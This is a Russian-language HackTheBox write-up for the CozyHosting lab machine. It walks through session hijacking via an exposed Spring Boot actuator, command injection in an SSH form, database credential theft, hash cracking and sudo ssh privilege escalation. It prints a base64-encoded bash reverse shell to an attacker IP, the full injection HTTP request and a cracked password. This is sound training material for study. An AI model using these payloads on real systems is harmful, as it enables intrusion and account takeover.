# CozyHosting (2025)

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure></div>

## Тэги:

* Java Spring Boot - /actuator
* CMD Injection
* Psql
* Sudo ssh

## Разведка

При сканировании портов было обнаружено `2` открытых `tcp`-порта - `22` и `80`:

```shellscript
$ nmap -sC -sV 10.129.229.88 -oN nmap.out        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 05:02 EST
Nmap scan report for 10.129.229.88
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

На `80` порту располагается страница с описанием веб-сайта:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure></div>

И кнопка ведущая на страницу авторизации:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure></div>

Профаззив директории и файлы был обнаружен эндпоинт /actuator:

```shellscript
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt  -u http://cozyhosting.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 62ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 82ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 83ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 51ms]
.                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 119ms]
```

Данный эндпоинт встречается в приложениях на основе `Spring Boot`:

> Spring Boot — это фреймворк Java с открытым исходным кодом, используемый для программирования автономных приложений Spring промышленного уровня с пакетом библиотек, упрощающих запуск и управление проектами.

С помощью него можно получить больше информации для дальнейшей эксплуатации:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure></div>

На эндпоинте `/actuator/sessions` была обнаружена сессия пользователя `kanderson`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure></div>

После замены `Cookie JSESSIONID` можно авторизоваться на ресурсе обновив страницу входа (`CTRL + R`):

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure></div>

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure></div>

## Получение первоначального доступа - app (CMD Injection)

В административной консоли `Cozy Cloud` есть возможность установки соединения через `ssh`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure></div>

При указании домена и имени пользователя отображается ошибка, которая связана с тем, что хост не добавлен в `.ssh/authorized_keys`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure></div>

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure></div>

Вывод ошибки также появляется в `GET`-параметре `error`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure></div>

Если указать случайные строки, например, `'123'`/`'123'`, то отобразится вывод, который похож на то, как если бы это был запуск команды `ssh` из терминала:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure></div>

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure></div>

Следовательно, можно попробовать проэксплуатировать `CMD Injection`, используя точку с запятой:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure></div>

Таким образом отобразилась полноценная ошибка ввода команды в `HTTP`-заголовке `Location`:

{% code overflow="wrap" %}
```http
Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]/bin/bash: line 1: 123: command not found/bin/bash: line 1: @123: command not found
```
{% endcode %}

Такая полезная нагрузка не сработала, поскольку в имени пользователя пробелы запрещены:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure></div>

Их можно экранировать с помощью переменной `${IFS}`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure></div>

С экранированным пробелом полезная нагрузка отработала:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

С помощью [Reverse Shell Generator](https://www.revshells.com/) можно сделать пэйлоад с реверс шеллом:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure></div>

Проще всего будет его "упаковать" в `base64`, чтобы не возникло проблем при передаче данных через `HTTP`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/CozyHosting]
└─$ echo "bash -i >& /dev/tcp/10.10.14.161/9999 0>&1" | base64 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjEvOTk5OSAwPiYxCg==
                                                                                                                                                                                                        
┌──(trager㉿hackandgtfo)-[~/HackTheBox/CozyHosting]
└─$ echo "bash -i  >& /dev/tcp/10.10.14.161/9999 0>&1" | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTYxLzk5OTkgMD4mMQo=
                                                                                                                                                                                                        
┌──(trager㉿hackandgtfo)-[~/HackTheBox/CozyHosting]
└─$ echo "bash -i  >& /dev/tcp/10.10.14.161/9999 0>&1 " | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTYxLzk5OTkgMD4mMSAK
```

Окончательный пэйлоад в `HTTP`-запросе для получения реверс шелла выглядит так:

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://cozyhosting.htb
Connection: keep-alive
Referer: http://cozyhosting.htb/admin?error=ssh:%20connect%20to%20host%200.0.0.123%20port%2022:%20Connection%20timed%20out
Cookie: JSESSIONID=EBC016DD623A2BF1EBDFE39F1AEF6C20	
Upgrade-Insecure-Requests: 1
Priority: u=0, i

host=example&username=;echo${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTYxLzk5OTkgMD4mMSAK${IFS}|base64${IFS}-d|bash;
```

Таким образом был получен первоначальный доступ:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure></div>

## Повышение привилегий - josh (jar-unpacking, psql, hashcat)

Стабилизация  оболочки:

```
app@cozyhosting:/app$ python3 -c 'import pty;pty.spawn("/bin/bash");'
app@cozyhosting:/app$ export TERM=xterm
```

В каталоге `/app` был обнаружен файл `cloudhosting-0.0.1.jar`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure></div>

Его можно распаковать с помощью утилиты `unzip`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure></div>

Используя документацию `Spring`, можно найти файл проекта, в котором хранятся конфигурационные данные проекта - `application.properties`:

{% embed url="https://docs.spring.io/spring-boot/reference/features/external-config.html" %}

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure></div>

В файле были найдены УД для `PostgreSQL`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure></div>

Подключиться локально к базе данных можно с помощью утилиты `psql`:

```shellscript
$ psql -U postgres -h 127.0.0.1
```

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Команда `\l` используется, чтобы отобразить все базы данных:

```shellscript
postgres=# \l
```

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

С помощью команды `\c` можно подключиться к одной из БД:

```shellscript
postgres=# \c cozyhosting
```

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Команда `\dt` отобразит все таблицы в БД:

```shellscript
cozyhosting=# \dt
```

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

С помощью стандартного синтаксиса `SQL` были извлечены все данные из таблицы `users`:

```shellscript
cozyhosting=# select * from users;
```

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Используя утилиту `hashid` был определен предполагаемый тип хеша:

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

С помощью утилиты `hashcat` хеш был взломан:

```shellscript
$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt

<...вырезано...>
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
<...вырезано...>
```

После чего можно авторизоваться под пользователем `josh`, который может запускать утилиту `ssh` с любыми опциями и аргументами от лица суперпользователя:

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

## Повышение привилегий - root (sudo ssh)

С помощью [шпаргалки gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo) можно проэксплуатировать мисконфиг:

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

И повысить привилегии до суперпользователя:

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
